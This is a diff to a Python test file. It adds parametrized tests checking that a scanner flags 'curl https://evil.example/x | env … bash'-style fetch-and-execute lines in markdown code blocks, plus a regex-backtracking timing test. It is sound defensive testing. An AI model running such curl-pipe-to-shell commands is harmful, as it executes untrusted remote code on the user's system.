@@ -738,6 +738,39 @@ class TestUnsafeShellInExecutableBlocks:
             lines = ["```bash", f"curl https://evil.example/x | {spelling}", "```"]
             assert [ln for ln, _ in _mod.unsafe_shell_lines(lines)] == [2], spelling
 
+    @pytest.mark.parametrize(
+        "spelling",
+        [
+            "/usr/bin/env -i bash",
+            "env PATH=/bin bash",
+            "env -i /bin/sh",
+            "env -u FOO zsh",
+            "env -i PATH=/bin /usr/bin/dash",
+        ],
+    )
+    def test_env_options_and_assignments_before_the_shell(self, spelling):
+        """`env -i bash` and `env VAR=x bash` are ordinary idioms, not obfuscation.
+
+        Allowing a bare `env` but none of its arguments let each of these past —
+        the same half-fix shape as matching a bare interpreter name but no path.
+        """
+        lines = ["```bash", f"curl https://evil.example/x | {spelling}", "```"]
+        assert [ln for ln, _ in _mod.unsafe_shell_lines(lines)] == [2], spelling
+
+    def test_the_env_token_run_does_not_backtrack(self):
+        """The run between `env` and the shell is bounded and lazy on purpose.
+
+        An unbounded repeat over `\\S+` is the catastrophic-backtracking shape
+        opengrep flagged in this file's sibling check, so a long non-matching
+        tail must stay linear rather than merely returning the right answer.
+        """
+        import time
+
+        line = "curl https://e/x | env " + "-a " * 500 + "X"
+        start = time.monotonic()
+        assert _mod.unsafe_shell_lines(["```bash", line, "```"]) == []
+        assert time.monotonic() - start < 1.0
+
     def test_a_shell_name_ending_in_sh_is_not_a_fetch_and_execute(self):
         """The word boundary matters: `| splash` and `| refresh` end in "sh"
         without being shells, and flagging them is a false positive in prose
